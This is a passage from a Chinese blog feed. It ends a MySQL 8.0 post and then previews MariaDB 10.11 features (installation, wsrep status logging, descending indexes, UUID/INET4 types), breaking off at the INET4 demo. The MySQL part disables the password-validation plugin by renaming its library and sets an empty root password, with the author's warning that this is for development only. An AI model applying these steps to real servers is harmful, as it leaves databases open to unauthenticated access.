<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [(none)]&gt; SELECT VALIDATE_PASSWORD_STRENGTH(&#x27;ShawnYan@CN_MYSQL8!&#x27;);</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| VALIDATE_PASSWORD_STRENGTH(&#x27;ShawnYan@CN_MYSQL8!&#x27;) |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">|                                               100 |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="修改-root-密码">修改 root 密码</h2>
<p>只是，在开发环境中，为了便于测试，我们可以临时将 root 密码改为空。</p>
<p>这里，将密码校验组件包改名，并重启 MySQL，检验功能会失效，但不影响 Server 正常启动。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/lib64/mysql/plugin/</span><br><span class="line">mv component_validate_password.so component_validate_password.so.bak</span><br><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-06-11T16:23:49.575004Z 0 [ERROR] [MY-013129] [Server] A message intended for a client cannot be sent there as no client-session is attached. Therefore, we&#x27;re sending the information to the error-log instead: MY-001126 - Can&#x27;t open shared library &#x27;/usr/lib64/mysql/plugin/component_validate_password.so&#x27; (errno: 0 /usr/lib64/mysql/plugin/component_validate_password.so: cannot open shared object file: No such file or directory)</span><br><span class="line">2023-06-11T16:23:49.575088Z 0 [ERROR] [MY-013129] [Server] A message intended for a client cannot be sent there as no client-session is attached. Therefore, we&#x27;re sending the information to the error-log instead: MY-003529 - Cannot load component from specified URN: &#x27;file://component_validate_password&#x27;.</span><br></pre></td></tr></table></figure></div>
<p>如此，即可不考虑密码强度而直接修改 root 密码。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [(none)]&gt; set password = &#x27;&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure></div>
<p>最后，这种方式仅限于开发调试，不推荐在生产环境操作。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
      </tags>
  </entry>
  <entry>
    <title>MariaDB v10.11 新特性速览</title>
    <url>/2023/mysql/mariadb-v10.11-new-feature/</url>
    <content><![CDATA[<p>MariaDB v10.11 是当前 MariaDB 最新的长维护版本，已经发了4个小版本，并且已经 GA 了2个小版本，最新版本为 MariaDB 10.11.3，发布时间为 2023-5-10。</p>
<h2 id="MariaDB-长维护版本信息">MariaDB 长维护版本信息</h2>
<p>从 MariaDB 官网可以了解到，当前的长维护版本有四个大版本，分别是10.4,10.5,10.6,10.11<br>
从10.6之后，MariaDB 改变了发版策略，所以 10.7-10.10 不在此表中，是为小周期版本，只发布新特性，不做长期维护。</p>
<p>目前推荐在生产环境中使用 MariaDB 10.6 的最新版，10.11 刚刚 GA 不久，建议先等几个小版本更新之后再上生产环境。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-2adc54f5-33b9-446c-995b-954b2ebd24b4.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="MariaDB-10-11-安装">MariaDB 10.11 安装</h2>
<p>由于测试环境使用的是centos7，所以在配置好yum源之后，直接安装即可。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo yum install MariaDB-*</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line"> Package                                                                      Arch                                     Version                                                       Repository                                        Size</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> MariaDB-backup                                                               x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   7.3 M</span><br><span class="line"> MariaDB-backup-debuginfo                                                     x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    46 M</span><br><span class="line"> MariaDB-client                                                               x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    16 M</span><br><span class="line"> MariaDB-client-debuginfo                                                     x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    50 M</span><br><span class="line"> MariaDB-columnstore-cmapi                                                    x86_64                                   22.08.2-1                                                     mariadb-aliyun                                    40 M</span><br><span class="line"> MariaDB-columnstore-engine                                                   x86_64                                   10.11.3_6.4.7-1.el7.centos                                    mariadb-aliyun                                   6.6 M</span><br><span class="line"> MariaDB-columnstore-engine-debuginfo                                         x86_64                                   10.11.3_6.4.7-1.el7.centos                                    mariadb-aliyun                                    76 M</span><br><span class="line"> MariaDB-common                                                               x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    82 k</span><br><span class="line"> MariaDB-common-debuginfo                                                     x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   185 k</span><br><span class="line"> MariaDB-compat                                                               x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   2.2 M</span><br><span class="line"> MariaDB-connect-engine                                                       x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   2.6 M</span><br><span class="line"> MariaDB-connect-engine-debuginfo                                             x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   3.4 M</span><br><span class="line"> MariaDB-cracklib-password-check                                              x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   8.0 k</span><br><span class="line"> MariaDB-cracklib-password-check-debuginfo                                    x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    22 k</span><br><span class="line"> MariaDB-devel                                                                x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   8.6 M</span><br><span class="line"> MariaDB-devel-debuginfo                                                      x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    13 k</span><br><span class="line"> MariaDB-gssapi-server                                                        x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    11 k</span><br><span class="line"> MariaDB-gssapi-server-debuginfo                                              x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    33 k</span><br><span class="line"> MariaDB-hashicorp-key-management                                             x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    32 k</span><br><span class="line"> MariaDB-hashicorp-key-management-debuginfo                                   x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   107 k</span><br><span class="line"> MariaDB-oqgraph-engine                                                       x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    71 k</span><br><span class="line"> MariaDB-oqgraph-engine-debuginfo                                             x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   1.4 M</span><br><span class="line"> MariaDB-provider-bzip2                                                       x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   7.5 k</span><br><span class="line"> MariaDB-provider-bzip2-debuginfo                                             x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    20 k</span><br><span class="line"> MariaDB-provider-lz4                                                         x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   7.4 k</span><br><span class="line"> MariaDB-provider-lz4-debuginfo                                               x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    19 k</span><br><span class="line"> MariaDB-provider-lzma                                                        x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   7.4 k</span><br><span class="line"> MariaDB-provider-lzma-debuginfo                                              x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    19 k</span><br><span class="line"> MariaDB-provider-lzo                                                         x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   7.3 k</span><br><span class="line"> MariaDB-provider-lzo-debuginfo                                               x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    19 k</span><br><span class="line"> MariaDB-provider-snappy                                                      x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   7.4 k</span><br><span class="line"> MariaDB-provider-snappy-debuginfo                                            x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    19 k</span><br><span class="line"> MariaDB-rocksdb-engine                                                       x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   5.1 M</span><br><span class="line"> MariaDB-rocksdb-engine-debuginfo                                             x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    73 M</span><br><span class="line"> MariaDB-s3-engine                                                            x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   1.0 M</span><br><span class="line"> MariaDB-s3-engine-debuginfo                                                  x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   3.9 M</span><br><span class="line"> MariaDB-server                                                               x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    27 M</span><br><span class="line"> MariaDB-server-debuginfo                                                     x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    99 M</span><br><span class="line"> MariaDB-shared                                                               x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   125 k</span><br><span class="line"> MariaDB-shared-debuginfo                                                     x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   456 k</span><br><span class="line"> MariaDB-test                                                                 x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                    42 M</span><br><span class="line"> MariaDB-test-debuginfo                                                       x86_64                                   10.11.3-1.el7.centos                                          mariadb-aliyun                                   104 M</span><br><span class="line">Installing for dependencies:</span><br><span class="line"> galera-4                                                                     x86_64                                   26.4.14-1.el7.centos                                          mariadb-aliyun                                   9.9 M</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Install  42 Packages (+1 Dependent package)</span><br><span class="line"></span><br><span class="line">Total download size: 627 M</span><br><span class="line">Installed size: 2.7 G</span><br><span class="line">Is this ok [y/d/N]: y</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>安装速度取决于网络下载速度，这里会稍微慢一点。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Installed:</span><br><span class="line">  MariaDB-backup.x86_64 0:10.11.3-1.el7.centos                                     MariaDB-backup-debuginfo.x86_64 0:10.11.3-1.el7.centos                           MariaDB-client.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-client-debuginfo.x86_64 0:10.11.3-1.el7.centos                           MariaDB-columnstore-cmapi.x86_64 0:22.08.2-1                                     MariaDB-columnstore-engine.x86_64 0:10.11.3_6.4.7-1.el7.centos</span><br><span class="line">  MariaDB-columnstore-engine-debuginfo.x86_64 0:10.11.3_6.4.7-1.el7.centos         MariaDB-common.x86_64 0:10.11.3-1.el7.centos                                     MariaDB-common-debuginfo.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-compat.x86_64 0:10.11.3-1.el7.centos                                     MariaDB-connect-engine.x86_64 0:10.11.3-1.el7.centos                             MariaDB-connect-engine-debuginfo.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-cracklib-password-check.x86_64 0:10.11.3-1.el7.centos                    MariaDB-cracklib-password-check-debuginfo.x86_64 0:10.11.3-1.el7.centos          MariaDB-devel.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-devel-debuginfo.x86_64 0:10.11.3-1.el7.centos                            MariaDB-gssapi-server.x86_64 0:10.11.3-1.el7.centos                              MariaDB-gssapi-server-debuginfo.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-hashicorp-key-management.x86_64 0:10.11.3-1.el7.centos                   MariaDB-hashicorp-key-management-debuginfo.x86_64 0:10.11.3-1.el7.centos         MariaDB-oqgraph-engine.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-oqgraph-engine-debuginfo.x86_64 0:10.11.3-1.el7.centos                   MariaDB-provider-bzip2.x86_64 0:10.11.3-1.el7.centos                             MariaDB-provider-bzip2-debuginfo.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-provider-lz4.x86_64 0:10.11.3-1.el7.centos                               MariaDB-provider-lz4-debuginfo.x86_64 0:10.11.3-1.el7.centos                     MariaDB-provider-lzma.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-provider-lzma-debuginfo.x86_64 0:10.11.3-1.el7.centos                    MariaDB-provider-lzo.x86_64 0:10.11.3-1.el7.centos                               MariaDB-provider-lzo-debuginfo.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-provider-snappy.x86_64 0:10.11.3-1.el7.centos                            MariaDB-provider-snappy-debuginfo.x86_64 0:10.11.3-1.el7.centos                  MariaDB-rocksdb-engine.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-rocksdb-engine-debuginfo.x86_64 0:10.11.3-1.el7.centos                   MariaDB-s3-engine.x86_64 0:10.11.3-1.el7.centos                                  MariaDB-s3-engine-debuginfo.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-server.x86_64 0:10.11.3-1.el7.centos                                     MariaDB-server-debuginfo.x86_64 0:10.11.3-1.el7.centos                           MariaDB-shared.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line">  MariaDB-shared-debuginfo.x86_64 0:10.11.3-1.el7.centos                           MariaDB-test.x86_64 0:10.11.3-1.el7.centos                                       MariaDB-test-debuginfo.x86_64 0:10.11.3-1.el7.centos</span><br><span class="line"></span><br><span class="line">Dependency Installed:</span><br><span class="line">  galera-4.x86_64 0:26.4.14-1.el7.centos</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<p>安装好之后用systemctl启动即可。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl start mariadb</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl status mariadb</span></span><br><span class="line">* mariadb.service - MariaDB 10.11.3 database server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; vendor preset: disabled)</span><br><span class="line">  Drop-In: /etc/systemd/system/mariadb.service.d</span><br><span class="line">           `-migrated-from-my.cnf-settings.conf</span><br><span class="line">   Active: active (running) since Wed 2023-06-07 14:51:18 JST; 5s ago</span><br><span class="line">     Docs: man:mariadbd(8)</span><br><span class="line">           https://mariadb.com/kb/en/library/systemd/</span><br><span class="line">  Process: 1388513 ExecStartPost=/bin/sh -c systemctl unset-environment _WSREP_START_POSITION (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 1388396 ExecStartPre=/bin/sh -c [ ! -e /usr/bin/galera_recovery ] &amp;&amp; VAR= ||   VAR=`cd /usr/bin/..; /usr/bin/galera_recovery`; [ $? -eq 0 ]   &amp;&amp; systemctl set-environment _WSREP_START_POSITION=$VAR || exit 1 (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 1388394 ExecStartPre=/bin/sh -c systemctl unset-environment _WSREP_START_POSITION (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 1388462 (mariadbd)</span><br><span class="line">   Status: &quot;Taking your SQL requests now...&quot;</span><br><span class="line">    Tasks: 21</span><br><span class="line">   Memory: 81.4M</span><br><span class="line">   CGroup: /system.slice/mariadb.service</span><br><span class="line">           `-1388462 /usr/sbin/mariadbd</span><br></pre></td></tr></table></figure></div>
<h2 id="MariaDB-10-11-新特性">MariaDB 10.11 新特性</h2>
<p>接下来快速体验一下 MariaDB 10.11 的新特性都有哪些，这里主要是相对于 10.6 来说的新特性。</p>
<h3 id="1-json-sst-progress-logging-mdev-26971">1. json sst progress logging mdev-26971</h3>
<p>当mariadb使用wsrep插件时，数据库初始化启动时，耗时较长，且没有任何日志输出，这并不利于监控，所以增加了json格式的日志文件，并通过新增的参数 <code>wsrep_status_file</code> 将文件指定位置。另外，增加了SST过程的相关日志。</p>
<p>本文为了测试，需要显示指定wsrep_status_file参数，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi my.cnf</span><br><span class="line"></span><br><span class="line">[mariadb]</span><br><span class="line">log_error=/data/mariadb/alert_err.log</span><br><span class="line">wsrep_status_file=/data/mariadb/wsrep-status.json</span><br></pre></td></tr></table></figure></div>
<p>启动db后，可以看到文件中有记录，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ more wsrep-status.json</span><br><span class="line">&#123;</span><br><span class="line">        &quot;date&quot;: &quot;2023-06-07 15:59:02.000&quot;,</span><br><span class="line">        &quot;timestamp&quot;: 1686121142.00000000,</span><br><span class="line">        &quot;errors&quot;: [</span><br><span class="line">        ],</span><br><span class="line">        &quot;warnings&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                        &quot;timestamp&quot;: 1686121142.00000000,</span><br><span class="line">                        &quot;msg&quot;: &quot;Plugin &#x27;OQGRAPH&#x27; is of maturity level gamma while the server is stable&quot;</span><br><span class="line">                &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;events&quot;: [</span><br><span class="line">        ],</span><br><span class="line">        &quot;status&quot;: &#123;</span><br><span class="line">                &quot;state&quot;: &quot;DISCONNECTED&quot;,</span><br><span class="line">                &quot;comment&quot;: &quot;Disconnected&quot;,</span><br><span class="line">                &quot;progress&quot;: &#123; &quot;from&quot;: -1, &quot;to&quot;: -1, &quot;total&quot;: -1, &quot;done&quot;: -1, &quot;indefinite&quot;: -1 &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>相关链接：</p>
<ul>
<li><a class="link"   href="https://jira.mariadb.org/browse/MDEV-26971" >MDEV-26971 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/galera-cluster-system-variables/#wsrep_status_file" >wsrep_status_file <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://galeracluster.com/library/documentation/mysql-wsrep-options.html#wsrep-status-file" >wsrep_status_file <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="2-dynamic-configuration">2. dynamic configuration</h3>
<p>有些innodb相关参数需要重启才能生效，这个变更是将某些参数调整为可动态生效。<br>
涉及到的参数有：innodb_log_file_size ,innodb_undo_tablespaces ,innodb_write_io_threads ,innodb_read_io_threads ,innodb_buffer_pool_chunk_size</p>
<p>另一方面，mysql 8.0.30 引入了新参数 innodb_redo_log_capacity，也是类似的作用，可以动态重新生成redo日志文件。</p>
<p>此外，从 MariaDB 10.11.0 开始，引入了新的动态参数 replicate_rewrite_db，再此之前一直作为一个选项，需要在my.cnf中进行定义。</p>
<p>相关链接：</p>
<ul>
<li><a class="link"   href="https://jira.mariadb.org/browse/MDEV-27812" >MDEV-27812 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://jira.mariadb.org/browse/MDEV-19229" >MDEV-19229 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://jira.mariadb.org/browse/MDEV-11026" >MDEV-19229 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="3-asc-desc-indexes">3. asc/desc indexes</h3>
<p>升序降序排列索引，这个语法很早就支持了，但是一直不曾实用，直到 MariaDB 10.8 才真正实现。</p>
<p>先来看下之前版本的效果：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">create</span> index idx_t1_id_desc <span class="keyword">on</span> t1(id <span class="keyword">desc</span>);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">0.05</span> sec)</span><br><span class="line">Records: <span class="number">0</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Note (Code <span class="number">1831</span>): Duplicate index `idx_t1_id_desc`. This <span class="keyword">is</span> deprecated <span class="keyword">and</span> will be disallowed <span class="keyword">in</span> a future <span class="keyword">release</span></span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1 use index (idx_t1_id);</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1 use index (idx_t1_id_desc);</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>创建降序索引会报出提醒，并且是否使用这个索引，查出的数据都是升序排列的。</p>
<p>而在最新版的mariadb中，可以看到支持该特性，演示效果如下。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t1 (id <span class="type">int</span>);</span><br><span class="line"><span class="keyword">create</span> index idx_t1_id <span class="keyword">on</span> t1(id);</span><br><span class="line"><span class="keyword">create</span> index idx_t1_id_desc <span class="keyword">on</span> t1(id <span class="keyword">desc</span>);</span><br><span class="line"><span class="keyword">insert</span> t1 <span class="keyword">select</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">insert</span> t1 <span class="keyword">select</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">insert</span> t1 <span class="keyword">select</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">insert</span> t1 <span class="keyword">select</span> <span class="number">4</span>;</span><br><span class="line"><span class="keyword">insert</span> t1 <span class="keyword">select</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1 use index (idx_t1_id);</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1 use index (idx_t1_id_desc);</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="4-data-types-–-uuid-inet4">4. data types – uuid/inet4</h3>
<ul>
<li>UUID<br>
UUID 数据类型，从MariaDB 10.7开始支持。<br>
通用唯一标识符(uuid)在计算中已经占有普遍地位。 128位值加上一个文本表示值和一系列版本类型的规定以确保唯一性，使其成为理想的数据类型。<br>
多年来，UUID数据类型仅作为MDEV-4958中的一个特性请求而存在，随着投票和观察者的慢慢积累，我们很高兴地宣布UUID数据类型的预览。</li>
</ul>
<p>Ref:</p>
<ul>
<li><a class="link"   href="https://jira.mariadb.org/browse/MDEV-4958" >MDEV-4958 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/uuid-data-type/" >UUID Data Type <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>demo:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> t_uuid (id uuid <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> uuid() <span class="keyword">primary</span> key);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.006</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">insert</span> t_uuid <span class="keyword">select</span> uuid();</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.003</span> sec)</span><br><span class="line">Records: <span class="number">1</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_uuid;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> id                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">79093247</span><span class="number">-0686</span><span class="number">-11</span>ee<span class="number">-895</span>d<span class="operator">-</span>fa163e852b1d <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>INET4<br>
INET4 数据类型，从 MariaDB 10.10 开始支持。<br>
类似于 INET6， INET4用于存储 IPv4 地址，以 4 byte 二进制字符串存储。</li>
</ul>
<p>演示：</p>
